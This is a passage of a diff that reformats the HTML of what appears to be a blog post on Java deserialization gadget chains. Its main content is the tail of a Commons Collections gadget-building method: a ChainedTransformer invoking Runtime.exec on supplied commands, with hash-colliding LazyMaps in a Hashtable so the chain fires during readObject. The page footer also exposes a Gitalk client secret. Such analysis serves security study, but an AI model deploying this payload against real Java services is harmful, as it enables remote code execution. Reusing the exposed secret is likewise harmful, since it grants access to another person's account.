-                    <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getMethod&#34;</span><span style="color:#f92672">,</span>
-                            <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>String<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> Class<span style="color:#f92672">[].</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span>
-                            <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span><span style="color:#e6db74">&#34;getRuntime&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>0<span style="color:#f92672">]}),</span>
-                    <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;invoke&#34;</span><span style="color:#f92672">,</span>
-                            <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>Object<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> Object<span style="color:#f92672">[].</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span>
-                            <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span>0<span style="color:#f92672">]}),</span>
-                    <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;exec&#34;</span><span style="color:#f92672">,</span>
-                            <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]{</span>String<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">},</span>
-                            <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]{</span>commands<span style="color:#f92672">}),</span>
-                    <span style="color:#66d9ef">new</span> ConstantTransformer<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> HashSet<span style="color:#f92672">&lt;&gt;())</span>
-            <span style="color:#f92672">}</span>
-    <span style="color:#f92672">);</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> Object <span style=color:#a6e22e>getObject</span><span style=color:#f92672>(</span><span style=color:#66d9ef>final</span> String commands<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
+    <span style=color:#75715e>// Init the transformer to exec commands.
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>final</span> Transformer transformerChain <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer<span style=color:#f92672>(</span>
+            <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]{</span>
+                    <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>),</span>
+                    <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getMethod&#34;</span><span style=color:#f92672>,</span>
+                            <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Class<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span>
+                            <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{</span><span style=color:#e6db74>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
+                    <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;invoke&#34;</span><span style=color:#f92672>,</span>
+                            <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> Object<span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span>
+                            <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{</span><span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>0<span style=color:#f92672>]}),</span>
+                    <span style=color:#66d9ef>new</span> InvokerTransformer<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;exec&#34;</span><span style=color:#f92672>,</span>
+                            <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]{</span>String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>},</span>
+                            <span style=color:#66d9ef>new</span> String<span style=color:#f92672>[]{</span>commands<span style=color:#f92672>}),</span>
+                    <span style=color:#66d9ef>new</span> ConstantTransformer<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> HashSet<span style=color:#f92672>&lt;&gt;())</span>
+            <span style=color:#f92672>}</span>
+    <span style=color:#f92672>);</span>
 
-    Map innerMap1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">();</span>
-    Map innerMap2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">();</span>
+    Map innerMap1 <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>();</span>
+    Map innerMap2 <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>();</span>
 
-    <span style="color:#75715e">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
-</span><span style="color:#75715e"></span>    Map lazyMap1 <span style="color:#f92672">=</span> LazyMap<span style="color:#f92672">.</span><span style="color:#a6e22e">decorate</span><span style="color:#f92672">(</span>innerMap1<span style="color:#f92672">,</span> transformerChain<span style="color:#f92672">);</span>
-    lazyMap1<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;yx&#34;</span><span style="color:#f92672">,</span> 1<span style="color:#f92672">);</span>
+    <span style=color:#75715e>// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
+</span><span style=color:#75715e></span>    Map lazyMap1 <span style=color:#f92672>=</span> LazyMap<span style=color:#f92672>.</span><span style=color:#a6e22e>decorate</span><span style=color:#f92672>(</span>innerMap1<span style=color:#f92672>,</span> transformerChain<span style=color:#f92672>);</span>
+    lazyMap1<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;yx&#34;</span><span style=color:#f92672>,</span> 1<span style=color:#f92672>);</span>
 
-    Map lazyMap2 <span style="color:#f92672">=</span> LazyMap<span style="color:#f92672">.</span><span style="color:#a6e22e">decorate</span><span style="color:#f92672">(</span>innerMap2<span style="color:#f92672">,</span> transformerChain<span style="color:#f92672">);</span>
-    lazyMap2<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;zY&#34;</span><span style="color:#f92672">,</span> 1<span style="color:#f92672">);</span>
+    Map lazyMap2 <span style=color:#f92672>=</span> LazyMap<span style=color:#f92672>.</span><span style=color:#a6e22e>decorate</span><span style=color:#f92672>(</span>innerMap2<span style=color:#f92672>,</span> transformerChain<span style=color:#f92672>);</span>
+    lazyMap2<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;zY&#34;</span><span style=color:#f92672>,</span> 1<span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// Use the colliding Maps as keys in Hashtable
-</span><span style="color:#75715e"></span>    Hashtable hashtable <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Hashtable<span style="color:#f92672">();</span>
-    hashtable<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>lazyMap1<span style="color:#f92672">,</span> 1<span style="color:#f92672">);</span>
-    hashtable<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>lazyMap2<span style="color:#f92672">,</span> 2<span style="color:#f92672">);</span>
+    <span style=color:#75715e>// Use the colliding Maps as keys in Hashtable
+</span><span style=color:#75715e></span>    Hashtable hashtable <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Hashtable<span style=color:#f92672>();</span>
+    hashtable<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>lazyMap1<span style=color:#f92672>,</span> 1<span style=color:#f92672>);</span>
+    hashtable<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>lazyMap2<span style=color:#f92672>,</span> 2<span style=color:#f92672>);</span>
 
-    <span style="color:#75715e">// Needed to ensure hash collision after previous manipulations
-</span><span style="color:#75715e"></span>    lazyMap2<span style="color:#f92672">.</span><span style="color:#a6e22e">remove</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;yy&#34;</span><span style="color:#f92672">);</span>
+    <span style=color:#75715e>// Needed to ensure hash collision after previous manipulations
+</span><span style=color:#75715e></span>    lazyMap2<span style=color:#f92672>.</span><span style=color:#a6e22e>remove</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;yy&#34;</span><span style=color:#f92672>);</span>
 
-    <span style="color:#66d9ef">return</span> hashtable<span style="color:#f92672">;</span>
-<span style="color:#f92672">}</span>
+    <span style=color:#66d9ef>return</span> hashtable<span style=color:#f92672>;</span>
+<span style=color:#f92672>}</span>
 </code></pre></div>
-            </div>
-        </div>
-        <div class="w-200">
-            <div id="gitalk"></div>
-<script>
-    var gitalk = new Gitalk({
-        clientID: '9a04c6b451fbce76511d',
-        clientSecret: '430c540c77ecd6b59749c60f0341c057bd5320a0',
-        repo: 'Causa1ity.github.io',
-        owner: 'Causa1ity',
-        admin: 'Causa1ity',
-        id: 'https:\/\/causality.top\/security\/javasec\/commonscollections3-7\/',
-        distractionFreeMode: false
-    })
-
-    gitalk.render('gitalk')
-</script>
-        </div>
-    </div>
 </div>
-<script>
-    CodeLine.initOnPageLoad({
-        copyBtn: {show: true, position: 'top'},
-        toggleBtn: {show: false}
-    })
-</script>
+</div>
+<div class=w-200>
+<div id=gitalk></div>
+<script>var gitalk=new Gitalk({clientID:'9a04c6b451fbce76511d',clientSecret:'430c540c77ecd6b59749c60f0341c057bd5320a0',repo:'Causa1ity.github.io',owner:'Causa1ity',admin:'Causa1ity',id:'https://causality.top/security/javasec/commonscollections3-7/',distractionFreeMode:!1});gitalk.render('gitalk')</script>
+</div>
+</div>
+</div>
+<script>CodeLine.initOnPageLoad({copyBtn:{show:!0,position:'top'},toggleBtn:{show:!1}})</script>
 <div class="text-center my-8">
-    <span class="font-serif text-lg">
-        Powered By <a href="https://gohugo.io/" class="font-bold hover:text-blue-400">Hugo</a>
-        with theme <a href="https://github.com/causa1ity/hugo-theme-noth/" class="font-bold hover:text-blue-400">Noth</a>
-    </span>
+<span class="font-serif text-lg">
+Powered By <a href=https://gohugo.io/ class="font-bold hover:text-blue-400">Hugo</a>
+with theme <a href=https://github.com/causa1ity/hugo-theme-noth/ class="font-bold hover:text-blue-400">Noth</a>
+</span>
 </div></body>
 </html>
